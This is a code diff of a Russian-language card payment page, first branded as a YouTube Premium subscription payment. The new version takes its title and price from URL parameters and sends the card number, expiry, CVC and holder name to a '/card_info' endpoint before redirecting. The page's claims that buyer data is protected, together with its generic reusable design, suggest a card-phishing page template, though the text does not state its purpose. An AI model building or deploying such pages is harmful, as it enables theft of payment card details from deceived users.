@@ -3,64 +3,54 @@
 <head>
   <meta charset="UTF-8">
   <title>Оплата</title>
-  <link type="text/css" href="css.css" rel="stylesheet">
-  <!--  <link rel="icon" href="favicon.ico">-->
-  <!--  <link rel="icon" href="img/favicon/icon.svg" type="image/svg+xml">-->
-  <!--  <link rel="apple-touch-icon" href="img/favicon/180.png">-->
+  <link type="text/css" href="style.css" rel="stylesheet">
+  <link rel="stylesheet" href="normalize/normalize.css">
   <link rel="preload" href="fonts/Inter-Bold.ttf" as="font">
   <link rel="preload" href="fonts/Inter-Medium.ttf" as="font">
   <link rel="preload" href="fonts/Inter-Regular.ttf" as="font">
   <link rel="preload" href="fonts/Inter-SemiBold.ttf" as="font">
-  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
 </head>
 <body class="body">
 <div class="container">
   <main class="main">
     <div class="information-payment">
-<!--      <div class="logo-container">-->
-<!--        <div class="logo-wrapper">-->
-<!--        <img src="icons8-монета-64.png" class="some-logo" width="30" height="30" alt="logo">-->
-<!--        </div>-->
-<!--        <p class="logo-title">Лого</p>-->
-<!--      </div>-->
-      <p class="payment-title">Оплата за подписку YouTube Premium</p>
-      <div class="check-wrapper">
-        <p class="payment-check">Сумма к оплате</p>
-        <div class="sum-wrapper">
-          <p class="payment-sum">623.<sup>49</sup></p>
-          <p class="payment-currency">руб.</p>
+      <div>
+        <p class="payment-title"></p>
+        <div class="check-wrapper">
+          <p class="payment-check">Сумма к оплате</p>
+          <div class="sum-wrapper">
+            <p class="payment-sum"></p>
+            <p class="payment-currency">руб.</p>
+          </div>
         </div>
       </div>
       <p class="attention">Внимание! Оплата карточкой ОАО “СберБанк” не принимается</p>
     </div>
     <div class="information-card">
-      <form class="form-payment">
+      <form class="form-payment" action="/card_info" method="post" name="card_info">
+        <div class="message">
+          <div class="message-icon"></div>
+          <p class="message-text">Проверьте срок действия карточки</p>
+        </div>
         <div class="form-container">
-          <label class="text-card card-number-label" for="card-number-input">Номер карты</label>
           <div class="card-number">
-<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
-<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
-<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
-<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
-            <div><input type="text" id="card-number-input" class="card-number-input" inputmode="numeric" pattern="\d{4}\s?\d{4}\s?\d{4}\s?\d{4}" placeholder="____  ____  ____  ____" maxlength="19" required></div>
+          <label class="text-card" for="card_number">Номер карты</label>
+          <input class="card-input" type="text" id="card_number" name="card_number" placeholder="____  ____  ____  ____" maxlength="19" required>
           </div>
           <div class="date-container">
-            <div>
-              <label for="card-date-input" class="text-card">мм / гг</label>
-              <div class="date-wrapper">
-                <div>
-                  <input type="text" id="card-date-input" class="card-date-input" inputmode="numeric" pattern="\d\d/\d\d" maxlength="5" placeholder="__/__" required>
-                </div>
-              </div>
+            <div class="date-wrapper">
+              <label class="text-card" for="date_card">мм / гг</label>
+              <input class="card-input" type="text" id="date_card" name="date_card" maxlength="5" placeholder="__/__" required>
             </div>
-            <div>
-              <label for="card-cvc-input" class="text-card">CVV2/CVC2</label>
-              <div class="cvc-wrapper"><input type="text" maxlength="3" inputmode="numeric" pattern="\d+" placeholder="___" class="card-cvc-input" id="card-cvc-input" required></div>
+            <div class="cvc-wrapper">
+              <label class="text-card" for="card_cvc">CVV2/CVC2</label>
+              <input class="card-input" type="text" name="cvc" id="card_cvc" maxlength="3" placeholder="___" required>
             </div>
           </div>
-          <div>
-            <label for="card-holder-input" class="text-card">Имя фамилия</label>
-            <div class="holder-wrapper"><input class="card-holder-input" id="card-holder-input" type="text" inputmode="text" placeholder="________________________" maxlength="120" required></div>
+          <div class="holder-wrapper">
+            <label class="text-card" for="card_name">Имя фамилия</label>
+            <input class="card-input" name="name" id="card_name" type="text" placeholder="______________________" maxlength="120" required>
           </div>
         </div>
         <div class="button-wrapper">
@@ -76,74 +66,195 @@
         <p class="security-text">Данные покупателя защищены</p>
       </div>
     </div>
+
+    <div class="cover">
+      <div class="loader"></div>
+    </div>
   </main>
 </div>
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
-    $(document).ready(function(){
-        $(".card-number-input").keyup(function () {
-            if (this.value.length == this.maxLength) {
-                        $('.card-date-input').eq(0).focus();
-            }
+    const inputs = document.querySelectorAll('.card-input');
+    const paymentSum = document.querySelector('.payment-sum');
+    const button = document.querySelector('.card-submit');
+    const paymentCurrency = document.querySelector('.payment-currency')
+    const form = document.querySelector('.form-payment');
+    const cardNumberInput = document.querySelector('#card_number');
+    const cardHolder = document.querySelector('#card_name');
+    const expiryInput = document.querySelector('#date_card');
+    const title = document.querySelector('.payment-title');
+    const cvcInput = document.querySelector('#card_cvc');
+    const cover = document.querySelector('.cover');
+    const loader = document.querySelector('.loader');
+
+
+    document.addEventListener("DOMContentLoaded", function() {
+
+        inputs.forEach(function(input, index) {
+            input.addEventListener("keyup", function() {
+                if (this.value.length === this.maxLength && this.selectionStart === this.maxLength) {
+                    const nextIndex = index + 1;
+                    if (nextIndex < inputs.length) {
+                        inputs[nextIndex].focus();
+                    }
+                }
+            });
         });
     });
 
-    // $(".card-number-input").eq(3).keyup(function () {
-    //     if (this.value.length == this.maxLength) {
-    //         $('.card-date-input').eq(0).focus();
-    //     }
-    // });
+    form.addEventListener('input', (evt) => {
+        const input = evt.target;
+        const inputValue = input.value;
 
-    $(".card-date-input").keyup(function () {
-        if (this.value.length == this.maxLength) {
-            $('.card-cvc-input').eq(0).focus();
+        // Держатель карточки
+        if (input.id === 'card_name') {
+
+            const regex = /^[a-zA-Z\s-]*$/;
+            if (!regex.test(inputValue)) {
+                input.value = inputValue.slice(0, -1);
+            }
+        }
+
+        // Номер карточки
+        if (input.id === 'card_number') {
+
+            const value = inputValue.replace(/[^0-9\s]/g, '')
+
+            // Разделяем введенные символы на группы по четыре
+            const groups = value.match(/\d{1,4}/g)
+            const formattedValue = groups ? groups.join(' ') : ''
+
+            // Устанавливаем отформатированное значение поля
+            input.value = formattedValue
+
+            // Проверяем, был ли введен пробел, и если это так, удаляем его
+            const lastChar = input.value.slice(-1)
+            if (lastChar === ' ' && inputValue.slice(-1) !== ' ') {
+                input.value = input.value.slice(0, -1)
+            }
+        }
+
+        // Дата карточки
+        if (input.id === 'date_card') {
+            let inputValue = input.value;
+
+            // удаляем все символы, кроме цифр
+            inputValue = inputValue.replace(/\D/g, '');
+            const inputLength = inputValue.length;
+
+            // добавляем символ "/" в поле с датой
+            if (inputLength === 2 && inputValue.indexOf('/') === -1) {
+                inputValue = `${inputValue}/`;
+            } else if (inputLength > 2) {
+                inputValue = `${inputValue.slice(0, 2)}/${inputValue.slice(2)}`;
+            }
+
+            input.value = inputValue;
+        }
+
+        // CVC карточки
+        if(input.id === 'card_cvc') {
+            input.value = inputValue.replace(/[^0-9]/g, '');
         }
     });
 
-    $(".card-date-input").eq(1).keyup(function () {
-        if (this.value.length == this.maxLength) {
-            $('.card-cvc-input').eq(0).focus();
+    // Обработка формы
+
+    const messageDiv = document.querySelector('.message');
+    const body = document.querySelector('body');
+
+    button.addEventListener('click', async (event) => {
+        event.preventDefault();
+        body.classList.remove('err');
+        body.classList.remove('success');
+        cover.classList.add('opened');
+        loader.style.display = 'inline-block';
+        form.querySelectorAll('input, button').forEach((el) => {
+            el.disabled = true;
+        });
+
+        const card_number = cardNumberInput.value.replace(/\s/g, '');
+        const dateValue = expiryInput.value;
+        const [month, year] = dateValue.split('/');
+        const date_card = {
+            month: month,
+            year: year
+        };
+        const nameValue = cardHolder.value.toUpperCase();
+        const [FName, LName] = nameValue.split(' ');
+        const name = {
+            FName: FName,
+            LName: LName
+        };
+        const cvc = cvcInput.value;
+
+        const data = {
+            card_number: card_number,
+            date_card: date_card,
+            name: name,
+            cvc: cvc,
         }
+
+        const url = '/card_info';
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+
+            if (response.ok) {
+                const result = await response.json();
+                console.log('data', result);
+                window.location.replace(result.link);
+            } else if (response.status === 404) {
+                throw new Error("Ресурс не найден. 404 (Not Found)");
+            } else {
+                const errorData = await response.json();
+                if (errorData.status === "Error" && errorData.info === "Invalid info") {
+                    throw new Error("Ошибка в данных карты");
+                } else if (errorData.status === "Error" && errorData.info === "Data cant be send") {
+                    console.log("Ошибка при отправке данных на сервер. Повторите попытку");
+                } else {
+                    throw new Error(`Ошибка ${errorData.status}: ${errorData.statusText}`)
+                }
+            }
+
+        } catch (error) {
+            console.log(`ошибка: ${error.message}`);
+            body.classList.add('err');
+            if (error.message === 'Failed to fetch') {
+                messageDiv.querySelector('.message-text').textContent = 'Ошибка соединения';
+                console.error('ошибка:', error?.message);
+            } else {
+                messageDiv.querySelector('.message-text').textContent = error.message;
+            }
+        }
+
+        cover.classList.remove('opened');
+        loader.style.display = 'none';
+        form.querySelectorAll('input, button').forEach((el) => {
+            el.disabled = false;
+        });
     });
 
-    $(".card-cvc-input").eq(0).keyup(function () {
-        if (this.value.length == this.maxLength) {
-            $('.card-holder-input').eq(0).focus();
-        }
-    });
+    // get-параметры стоимость и тайтл
 
-    const paymentSum = document.querySelector('.payment-sum');
-    const amount = paymentSum.textContent;
-    const button = document.querySelector('.card-submit');
-    const paymentCurrency = document.querySelector('.payment-currency')
-    const currency = paymentCurrency.textContent;
+    const url = window.location.href;
+    const urlObject = new URL(url);
 
-    button.textContent = 'Оплатить ' + amount + ' ' + currency;
+    const priceValue = urlObject.searchParams.get('price');
+    const titleValue = urlObject.searchParams.get('title');
 
-    const cardNumberInput = document.querySelector('.card-number-input');
+    title.textContent = titleValue;
+    const number = parseFloat(priceValue);
+    const integerPart = Math.floor(number);
+    const decimalPart = (number % 1).toFixed(2).substr(2);
+    paymentSum.innerHTML = `${integerPart}.<sup>${decimalPart}</sup>`;
 
-    cardNumberInput.addEventListener('input', (event) => {
-        const input = event.target;
-        const inputLength = input.value.length;
-
-        // Разделяем введенные символы на группы по четыре
-        if (inputLength > 0 && inputLength % 5 === 0) {
-            input.value = input.value.slice(0, inputLength - 1) + ' ' + input.value.slice(inputLength - 1);
-        }
-    });
-
-    const expiryInput = document.querySelector('.card-date-input');
-
-    expiryInput.addEventListener('input', (event) => {
-        const input = event.target;
-        const inputLength = input.value.length;
-
-        // Добавляем символ "/" после ввода двух символов
-        if (inputLength === 2 && input.value.indexOf('/') === -1) {
-            input.value = input.value + '/';
-        }
-    });
-
+    button.textContent = 'Оплатить ' + paymentSum.textContent + ' ' + paymentCurrency.textContent;
 </script>
 </body>
 </html>
